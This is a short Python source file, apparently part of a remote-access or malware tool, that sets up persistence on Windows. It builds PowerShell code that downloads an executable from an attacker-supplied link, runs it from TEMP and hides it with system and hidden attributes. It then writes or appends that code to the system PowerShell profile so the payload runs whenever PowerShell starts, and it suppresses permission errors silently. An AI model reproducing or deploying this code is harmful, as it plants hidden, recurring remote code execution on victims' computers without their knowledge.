def profile(link):
	code  = '\nif(-Not (Test-Path "$env:TEMP\ps_shell.exe") ){'
	code += '\n(New-Object System.Net.WebClient).DownloadFile("{}","$env:TEMP\ps_shell.exe")'.format(link)
	code += '\n$pth = (Resolve-Path .\).Path'
	code += "\ncd $env:TEMP;.\ps_shell.exe"
	code += "\nattrib +s +h ps_shell.exe"
	code += "\ncd $pth}"
	pth   = get_output( 'powershell -c "echo $PsHome"' ).strip()
	chpro = get_output( "IF EXIST {} (echo true)".format(pth+"\\profile.ps1") ).strip()
	if chpro != "true":
		try:
			f = open( pth+"\\profile.ps1" , "w" )
			f.write(code)
			f.close()
		except:
			pass #not enough permissions to create!
	else:
		try:
			f = open( pth+"\\profile.ps1" , "a" )
			f.write(code)
			f.close()
		except:
			pass #not enough permissions to edit!

profile(link)
